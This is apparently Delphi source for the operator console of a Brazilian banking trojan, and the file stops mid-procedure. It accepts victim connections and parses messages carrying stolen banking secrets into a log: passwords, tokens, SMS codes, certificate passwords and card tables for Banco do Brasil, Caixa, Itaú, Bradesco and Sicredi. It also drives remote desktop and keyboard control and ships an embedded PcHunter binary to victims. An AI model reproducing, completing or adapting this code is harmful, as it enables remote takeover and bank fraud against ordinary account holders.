unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Menus, System.Win.ScktComp,
  Vcl.ImgList, Vcl.ExtCtrls, Vcl.ComCtrls, Vcl.StdCtrls, Vcl.Buttons,  zLibEx, LH5Unit,xpman,
  StreamManager,Jpeg,
  AppEvnts, MMSystem;

  type
  TSock_Thread = class(TThread)
  private
    Socket: TCustomWinSocket;
  public
    constructor Create(aSocket: TCustomWinSocket);
    procedure Execute; override;
  end;

type
  TSock_Thread2 = class(TThread)
  private
    Socket: TCustomWinSocket;
  public
    constructor Create(aSocket: TCustomWinSocket);
    procedure Execute; override;
  end;


type
  TForm1 = class(TForm)
    Panel1: TPanel;
    BitBtn1: TBitBtn;
    GroupBox1: TGroupBox;
    StatusBar1: TStatusBar;
    Timer1: TTimer;
    ImageList1: TImageList;
    SS1: TServerSocket;
    PopupMenu1: TPopupMenu;
    Fecharconexo1: TMenuItem;
    N1: TMenuItem;
    FecharConexo2: TMenuItem;
    Timer3: TTimer;
    Label3: TLabel;
    Edit1: TEdit;
    GroupBox2: TGroupBox;
    Label10: TLabel;
    Label11: TLabel;
    Edit6: TEdit;
    Edit7: TEdit;
    Button7: TButton;
    Button4: TButton;
    Button9: TButton;
    Button6: TButton;
    Label6: TLabel;
    Label5: TLabel;
    Label9: TLabel;
    Label1: TLabel;
    Edit2: TEdit;
    Timer2: TTimer;
    LV1: TListView;
    Label7: TLabel;
    Label8: TLabel;
    procedure BitBtn1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
    procedure SS1Accept(Sender: TObject; Socket: TCustomWinSocket);
    procedure SS1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure SS1ClientError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure SS1Listen(Sender: TObject; Socket: TCustomWinSocket);
    procedure Fecharconexo1Click(Sender: TObject);
    procedure SS1ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure Timer2Timer(Sender: TObject);
    procedure C1Click(Sender: TObject);
  private
    { Private declarations }
  public
     L,L9: TListItem;
    ID: String;
   // procedure ChecaLicenca();
    procedure Destrava();
    function HexToStr(Value: string): string;
    { Public declarations }
  end;

var
  Form1: TForm1;
  Lista : TStringList;
  Aviso : string;
  TimerLigado : Boolean;
  lastsort  : integer=1;
  PcHunterSocket : TCustomWinSocket;
  FileUpStream   : TMemoryStream;

  function InsereSom(Palavra: string; Situ: string; BBco : string): Boolean;
  function InsereSom2(letras: string; ssom: string): Boolean;
implementation

uses Unit2;


procedure TForm1.C1Click(Sender: TObject);
var
  Desktop: TForm2;
  Socket: TCustomWinSocket;
begin
  if LV1.ItemIndex < 0 then
    exit;


  if LV1.Selected.SubItems.Objects[2] = nil then
  begin
   // Desktop := TForm2.Create(self);
    LV1.Selected.SubItems.Objects[2] := TObject(Desktop);
    //Desktop.Show;
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Desktop.Socket := Socket;
    Socket.SendText('<DESKTOP>');
  end
  else if (LV1.Selected.SubItems.Objects[2] as TForm2).Visible = false then
  begin
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
   (LV1.Selected.SubItems.Objects[2] as TForm2).Socket := Socket;
   // (LV1.Selected.SubItems.Objects[2] as TForm2).Show;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket.SendText('<DESKTOP>');
  end

end;

procedure TForm1.Destrava();
begin
  if Form1.Edit6.Text = 'Desk' then
  begin
    (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox1.Enabled := True;
    (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox3.Enabled := True;
    (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox5.Enabled := True;
    (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox1.Checked := True;
    (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox5.Checked := True;
  end;


  if Form1.Edit6.Text = 'Navi' then
  begin
    (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox4.Enabled := True;
    (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox3.Enabled := True;
    (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox5.Enabled := True;
    (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox4.Checked := True;
    (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox5.Checked := True;
  end;
end;


function IpIsBlocked(List: TStrings; const IPBlocked: string): Boolean;
Var
I: Integer;
begin
Result := False;
for i := 0 to List.Count -1 do
if List.Strings[I] = IPBlocked then
Result := True;
end;

function Insere(Palavra: string; Banco: string): Boolean;
var
  I : Integer;
  L, L2: TListItem;
begin
  for I := 0 to Form1.LV1.Items.Count-1 do
  begin
    if (Palavra = Form1.LV1.Items[I].Caption) then
    begin
      Form1.LV1.Items[i].SubItems[5] := Banco;
      break;
    end;
  end;
end;

function InsereNavi(Palavra: string; Navegador: string): Boolean;
var
  I : Integer;
  L, L2: TListItem;
begin
  for I := 0 to Form1.LV1.Items.Count-1 do
  begin
    if (Palavra = Form1.LV1.Items[I].Caption) then
    begin
      Form1.LV1.Items[i].SubItems[6] := Navegador;
    end;
  end;
end;

function InsereSom(Palavra: string; Situ: string; BBco : string): Boolean;
var
  I : Integer;
  L, L2: TListItem;
begin
  for I := 0 to Form1.LV1.Items.Count - 1 do
  begin
    if (Palavra = Form1.LV1.Items[I].Caption) then
    begin
     if Form1.LV1.Items[i].SubItems[7] = '' then
     begin
     // form1.JvThread1.Execute(0);
      TimerLigado := True;
      Form1.LV1.Items[I].Selected := True;
      Form1.LV1.Items[I].SubItems[5] := BBco;
      Form1.LV1.Items[I].SubItems[7] := Situ;
     end;
    end;
  end;
end;

function InsereSom2(letras: string; ssom: string): Boolean;
var
  I : Integer;
  L, L2: TListItem;
begin
 if letras = Form1.Edit7.Text then
 Form1.Button7.Click;
 letras:= '';
    //  if (fileexists('c:\som.wav')) then
    //  SndPlaySound('c:\som.wav', SND_ASYNC);
   //   Form1.LV1.Items[i].Selected := True;
   //   Form1.LV1.Items[i].SubItems[7] := ssom;
end;
   //   end;




function InsereSom1(Palavra: string; Situ: string): Boolean;
var
  I : Integer;
  L, L2: TListItem;
begin
  for I := 0 to Form1.LV1.Items.Count-1 do
  begin
    if (Palavra = Form1.LV1.Items[I].Caption) then
    begin
      Form1.LV1.Items[i].SubItems[7] := Situ;
    end;
  end;
end;

// Pegar Diretório Temporário do Windows
function  PegaTempDir : String;//Pega o diretorio da Pasta Temporaria
var DiretorioTemp : PChar;
    TempBuffer    : Dword;
begin
  TempBuffer := 255;
  GetMem(DiretorioTemp,255);
  try
    GetTempPath(tempbuffer,diretoriotemp);
    result := DiretorioTemp;
  finally
    FreeMem(diretoriotemp);
  end;
end;

function ExtractPcHunter(ProcWIN : string; Procs : TMemoryStream) : Boolean;
var
 NumId        : Integer;
 ResStream    : TResourceStream;
begin
 if ProcWIN = '64' then
 begin
   NumId := 200;
 end else
 begin
   NumId := 100;
 end;
 try
   ResStream := TResourceStream.CreateFromID(SysInit.HInstance, NumId, RT_RCDATA);
   ResStream.Position := 0;
   Procs.Position := 0;
   Procs.CopyFrom(ResStream, ResStream.Size);
 finally
   FreeAndNil(ResStream);
 end;
end;



procedure Salva;
var Arquivo: TStringList;
begin
  Arquivo := TStringList.Create;
  try
    Arquivo.LoadFromFile(PegaTempDir + 'infos.txt');
    Arquivo.add(Form1.Label5.Caption);
    Arquivo.SaveToFile(PegaTempDir + 'infos.txt');
  finally
    Arquivo.Free;
  end;
end;


procedure Salva1;
var Arquivo: TStringList;
begin
  Arquivo := TStringList.Create;
  try
    Arquivo.LoadFromFile(PegaTempDir + 'infos1.txt');
    Arquivo.add(Form1.Label9.Caption);
    Arquivo.SaveToFile(PegaTempDir + 'infos1.txt');
  finally
    Arquivo.Free;
  end;
end;


Constructor TSock_Thread.Create(aSocket: TCustomWinSocket);
begin
  inherited Create(true);
  Socket := aSocket;
  FreeOnTerminate := true;
end;

Constructor TSock_Thread2.Create(aSocket: TCustomWinSocket);
begin
  inherited Create(true);
  Socket := aSocket;
  FreeOnTerminate := true;
end;


{$R *.dfm}

function TForm1.HexToStr(Value: string): string;
var
  I: Integer;
begin
  Result := '';
  for I := 1 to Length(Value) do
  begin
    if ((I mod 2) = 1) then
      Result := Result + Chr(StrToInt('0x'+ Copy(Value, I, 2)));
  end;
end;

procedure DoExpand(inStream: TStream);
const
  BufferSize = 4096;
var
  Count: Integer;
  outMS: TMemoryStream;
 // ZStream: TCustomZLibStream;
  Buffer: array [0 .. BufferSize - 1] of Byte;
begin
  outMS := TMemoryStream.Create;
  try
    inStream.Seek(0, soFromBeginning);
    outMS.Size := 0;
   // ZStream := TDecompressionStream.Create(inStream);
    try
      while true do
      begin
     //   Count := ZStream.Read(Buffer, BufferSize);
        if Count <> 0 then
          outMS.WriteBuffer(Buffer, Count)
        else
          Break;
      end;
    finally
   //   freeandnil(ZStream);
    end;
    inStream.Size := outMS.Size;
    inStream.Position := 0;
    inStream.CopyFrom(outMS, 0);
  finally
    freeandnil(outMS);
    inStream := nil;
  end;
end;


// Descomprime dados
function DeCompressStream(SrcStream: TMemoryStream): boolean;
var
  InputStream, OutputStream: TMemoryStream;
  inbuffer, outbuffer: Pointer;
  count, outcount: longint;
begin
  result := false;
  if not assigned(SrcStream) then
    exit;

  InputStream := TMemoryStream.Create;
  OutputStream := TMemoryStream.Create;
  try
    InputStream.LoadFromStream(SrcStream);
    count := InputStream.Size;
    getmem(inbuffer, count);
    InputStream.ReadBuffer(inbuffer^, count);
    zdecompress(inbuffer, count, outbuffer, outcount);
    OutputStream.Write(outbuffer^, outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    result := true;
  finally
    InputStream.Free;
    OutputStream.Free;
    FreeMem(inbuffer, count);
    FreeMem(outbuffer, outcount);
  end;
end;

// Descomprime dados
procedure ExpandStream(inStream, outStream: TStream);
const
  BufferSize = 4096;
var
  count: Integer;
  ZStream: TZDecompressionStream;
  Buffer: array [0 .. BufferSize - 1] of Byte;
begin
  ZStream := TZDecompressionStream.Create(inStream);
  try
    while true do
    begin
      count := ZStream.Read(Buffer, BufferSize);
      if count <> 0 then
        outStream.WriteBuffer(Buffer, count)
      else
        Break;
    end;
  finally
    ZStream.Free;
  end;
end;




// Thread principal, onde será definido onde a conexão será de informações, Desktop Remoto, Teclado Remoto, Baixar e Enviar arquivos.
procedure TSock_Thread.Execute;
var
  s, s2: String;
  L: TListItem;
  TamanhoFile: Integer;
  TSTPrincipal: TSock_Thread2;
  Desktop: TForm2;

begin
  inherited;

  while not Terminated and Socket.Connected do
  begin
    if Socket.ReceiveLength > 0 then
    begin
      s := Socket.ReceiveText;

      if Pos('<|PRINCIPAL|>', s) > 0 then
      begin
        TSTPrincipal := TSock_Thread2.Create(Socket);
        TSTPrincipal.Resume;
        Socket.SendText('<|OK|>');
        Destroy;
      end;

   if Pos('<|Desktop|>', s) > 0 then
      begin
        Form1.LV1.Selected.SubItems.Objects[1] := TObject(Socket);
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto :=
          TRemoto.Create(true);
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto.Socket
          := Socket;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto.Resume;
        Destroy;
      end;


if Pos('<|KEYBOARD|>', s) > 0 then
      begin
        s2 := s;
        Delete(s2, 1, Pos('<|KEYBOARD|>', s2) + 11);

        s2 := Copy(s2, 1, Pos('<<|', s2) - 1);
        L := Form1.LV1.FindCaption(0, s2, false, true, false);
        if L <> nil then
          (L.SubItems.Objects[2] as TForm2).Socket2 := Socket;
        Destroy;
      end;



    end;
    Sleep(10);
  end;
end;


procedure TSock_Thread2.Execute;
var
  s, s3,s2, iden, SO, Proc, Senha, Bank : string;
  BBB6, BBBA, ITA6, CEF6,  BBEA, BBES, BRST, SICT, ITAT,
  HSAV, SICA, Navi, Tra1, Trav, Des2, ITAN, SANA, SANT, SANS,
  BRAT, GFB8, DEST, HSA7, HSA4, HST, HST6, ITTB, BRAC, HSTOKEMP,  DES4, BBESTSE6,
  NETC, NETT, SMSB, GFBC, GFBT, TOKE, ITE6, ITEN, CEFS, CEFU: String;

  L, L2: TListItem;
  ping1, ping2, i: Integer;
  Lista: TStrings;
begin
  inherited;

  Socket.SendText('<|SocketMain|>' + intToStr(Socket.Handle) + '<<|');
  while not Terminated and Socket.Connected do
  begin
    if Socket.ReceiveLength > 0 then
    begin
      s := Socket.ReceiveText;
      if Pos('<|Info|>', s) >0 then
      begin
        s2 := s;

        Delete(s2, 1, Pos('<|Info|>', s2)+7);
        Iden := Copy(s2, 1, Pos('<|>', s2)-1);

        Delete(s2, 1, Pos('<|>', s2)+2);
        SO := Copy(s2, 1, Pos('<|>', s2)-1);

        Delete(s2, 1, Pos('<|>', s2)+2);
        Proc := Copy(s2, 1, Pos('<|>', s2)-1);

        Delete(s2, 1, Pos('<|>', s2)+2);
        Senha := Copy(s2, 1, Pos('<|>', s2)-1);

        Delete(s2, 1, Pos('<|>', s2)+2);
        Bank := Copy(s2, 1, Pos('<|>', s2)-1);

        Delete(s2, 1, Pos('<|>', s2)+2);
        Navi := Copy(s2, 1, Pos('<<|', s2)-1);

        if Senha = Form1.Edit2.Text then
        begin
          L := Form1.LV1.Items.Add;
          L.Caption := intToStr(Socket.Handle);
          L.SubItems.Add(Iden);
          L.SubItems.Add(SO);
          L.SubItems.Add(Proc);
          L.SubItems.Add(Socket.RemoteAddress);
          L.SubItems.Add('...');
          L.SubItems.Add(Bank);
          L.SubItems.Add(Navi);
          L.SubItems.Add(' ');
          L.SubItems.Add(' ');
          L.SubItems.Objects[0] := TObject(Socket);
        end
        else
          Socket.SendText('<|NOSenha|>');
      end;

        if Pos('<|WinVersao|>', s) > 0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|WinVersao|>', s2) + 12);
         s2 := Copy(s2, 1, Pos('<|>', s2)-1);
         FileUpStream := TMemoryStream.Create;
         ExtractPcHunter(s2, FileUpStream);
         FileUpStream.Position := 0;
         Socket.SendText('<|UpLigado|>')
        end;




        // Captura Senha 6 Dígitos BB
        if Pos('<|BBB6|>', s) >0 then begin
         s2 := s;
         Delete(s2, 1, Pos('<|BBB6|>', s2)+7);
         BBB6 := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Senha 6 BB: ' + BBB6;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         Form2.Label6.Caption:= '';
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Senha Auto Atendimento
        if Pos('<|BBBA|>', s) >0 then begin
         s2 := s;
         Delete(s2, 1, Pos('<|BBBA|>', s2)+7);
         BBBA := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Senha Auto Atendimento: ' + BBBA;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Travamento Tela
        if Pos('<|Trav|>', s) >0 then begin
         s2 := s;
         Delete(s2, 1, Pos('<|Trav|>', s2)+7);
         Trav := Copy(s2, 1, Pos('<|>', s2)-1);
         if Trav <> ' ' then
           (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Label5.Caption := Trav;
        end;


        // Captura Travamento Tela
        if Pos('<|Tra1|>', s) >0 then begin
         s2 := s;
         Delete(s2, 1, Pos('<|Tra1|>', s2)+7);
         Tra1 := Copy(s2, 1, Pos('<|>', s2)-1);
          if Tra1 <> ' ' then
            (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).destrava1();
        end;

       // Captura Senha 6 Dígitos CEF
        if Pos('<|CEF6|>', s) >0 then begin
         s2 := s;
         Delete(s2, 1, Pos('<|CEF6|>', s2)+7);
         CEF6 := Copy(s2, 1, Pos('<|>', s2)-1);
          Form1.Label5.Caption := Iden + ' - Assinatura CEF: ' + CEF6;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Senha NET CEF
        if Pos('<|CEFS|>', s) >0 then begin
         s2 := s;
         Delete(s2, 1, Pos('<|CEFS|>', s2)+7);
         CEFS := Copy(s2, 1, Pos('<|>', s2)-1);
          Form1.Label5.Caption := Iden + ' - Senha NET CEF: ' + CEFS;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Usuário CEF
        if Pos('<|CEFU|>', s) >0 then begin
         s2 := s;
         Delete(s2, 1, Pos('<|CEFU|>', s2)+7);
         CEFU := Copy(s2, 1, Pos('<|>', s2)-1);
           Form1.Label5.Caption := Iden + ' - Usuário CEF: ' + CEFU;
          (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;


        // Captura Senha 6 Dígitos ITA
        if Pos('<|ITA6|>', s) >0 then begin
         s2 := s;
         Delete(s2, 1, Pos('<|ITA6|>', s2)+7);
         ITA6 := Copy(s2, 1, Pos('<|>', s2)-1);
          Form1.Label5.Caption := Iden + ' - Senha 6 ITAÚ: ' + ITA6;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Token ITAU
        if Pos('<|ITAT|>', s) >0 then begin
         s2 := s;
         Delete(s2, 1, Pos('<|ITAT|>', s2)+7);
         ITAT := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Token ITAÚ: ' + ITAT;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;


        // Captura Nascimento ITAU
        if Pos('<|ITAN|>', s) >0 then begin
         s2 := s;
         Delete(s2, 1, Pos('<|ITAN|>', s2)+7);
         ITAN := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label7.Caption := Iden + ' - Nascimento: ' + ITAN;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label7.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Token SICREDI
        if Pos('<|SICT|>', s) >0 then begin
         s2 := s;
         Delete(s2, 1, Pos('<|SICT|>', s2)+7);
         SICT := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Token SICREDI: ' + SICT;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Assinatura SICREDI
        if Pos('<|SICA|>', s) >0 then begin
         s2 := s;
         Delete(s2, 1, Pos('<|SICA|>', s2)+7);
         SICA := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Ass. SICREDI: ' + SICA;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

          // Captura Senha CC Desco
        if Pos('<|BRAC|>', s) >0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|BRAC|>', s2)+7);
         BRAC := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Senha 6 Desco: ' + BRAC;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Token SMS
        if Pos('<|BRST|>', s) > 0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|BRST|>', s2)+7);
         BRST := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Token Celular: ' + BRST;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Token DESCO
        if Pos('<|BRAT|>', s) >0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|BRAT|>', s2)+7);
         BRAT := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Token BRAD: ' + BRAT;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Senha GF
        if Pos('<|GFB8|>', s) >0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|GFB8|>', s2)+7);
         GFB8 := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Senha GF: ' + GFB8;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;


        // Captura Senha BB Estilo
        if Pos('<|BBESTSE6|>', s) >0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|BBESTSE6|>', s2)+7);
         BBESTSE6 := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Senha 6: ' + BBESTSE6;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Certificado GF
        if Pos('<|GFBC|>', s) >0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|GFBC|>', s2)+7);
         GFBC := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Senha Cert. GF: ' + GFBC;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Token GF
        if Pos('<|GFBT|>', s) >0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|GFBT|>', s2)+7);
         GFBT := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Token GF: ' + GFBT;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Tabela Desco
        if Pos('<|DEST|>', s) >0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|DEST|>', s2)+7);
         DEST := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Tab Desco ' + Form1.Label8.Caption +': ' + DEST;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Tabela Itaú
        if Pos('<|ITTB|>', s) >0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|ITTB|>', s2)+7);
         ITTB := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Tab Itaú ' + Form1.Label8.Caption +': ' + ITTB;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;




        // Captura Senha 4 Desco
        if Pos('<|DES4|>', s) > 0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|DES4|>', s2)+7);
         DES4 := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Senha 4 Desco: ' + DES4;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Certificado Desco Net
        if Pos('<|NETC|>', s) >0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|NETC|>', s2)+7);
         NETC := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Senha Cert. Desco: ' + NETC;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Token Desco Net
        if Pos('<|NETT|>', s) > 0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|NETT|>', s2)+7);
         NETT := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Token Desco: ' + NETT;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura SMS BB
        if Pos('<|SMSB|>', s) > 0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|SMSB|>', s2)+7);
         SMSB := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Código SMS: ' + SMSB;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Certificado BB EMPRESA
        if Pos('<|BBES|>', s) > 0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|BBES|>', s2)+7);
         BBES := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Senha Cert. BB: ' + BBES;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Senha de Acesso BB EMPRESA
        if Pos('<|BBEA|>', s) > 0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|BBEA|>', s2)+7);
         BBEA := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Senha Acesso BB: ' + BBEA;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;




        // Captura Senha 6 Dígitos ITA EMPRESA
        if Pos('<|ITE6|>', s) >0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|ITE6|>', s2)+7);
         ITE6 := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Senha 6 ITAÚ: ' + ITE6;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        // Captura Token ITA EMPRESA
        if Pos('<|TOKE|>', s) >0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|TOKE|>', s2)+7);
         TOKE := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Token ITAÚ: ' + TOKE;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;


        // Captura Nascimento ITA EMPRESA
        if Pos('<|ITEN|>', s) >0 then
        begin
         s2 := s;
         Delete(s2, 1, Pos('<|ITEN|>', s2)+7);
         ITEN := Copy(s2, 1, Pos('<|>', s2)-1);
         Form1.Label5.Caption := Iden + ' - Nascimento ITAÚ: ' + ITEN;
         (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
         Form1.Button7.Click;
         Form1.Destrava;
        end;

        if Pos('<|PONG|>', s)>0 then
        begin
         L := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
         ping1 := Integer(L.SubItems.Objects[5]);
         ping2 := GetTickCount-Ping1;
         L.SubItems[4] := intToStr(ping2);
        end;
    end;
    Sleep(10);
  end;
end;





procedure TForm1.BitBtn1Click(Sender: TObject);
begin
  if BitBtn1.Caption = 'Iniciar Sessão' then
  begin
    LV1.Enabled := true;
    BitBtn1.Caption := 'Parar Sessão';
    SS1.Port := strToInt(Edit1.Text);
    SS1.Active := true;
    Edit1.Enabled := false;
  end
  else
  begin
    LV1.Enabled := false;
    BitBtn1.Caption := 'Iniciar Sessão';
    StatusBar1.Panels.Items[1].Text := 'Desativado';
    SS1.Active := false;
    LV1.Clear;
    Edit1.Enabled := true;
  end;

end;

procedure TForm1.Fecharconexo1Click(Sender: TObject);
var
  Desktop: TForm2;
  Socket: TCustomWinSocket;
begin
  if LV1.ItemIndex < 0 then
    exit;


  if LV1.Selected.SubItems.Objects[2] = nil then
  begin
    Desktop := TForm2.Create(self);
    LV1.Selected.SubItems.Objects[2] := TObject(Desktop);
    Desktop.Show;

    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Desktop.Socket := Socket;
   // Socket.SendText('<DESKTOP>');
  end
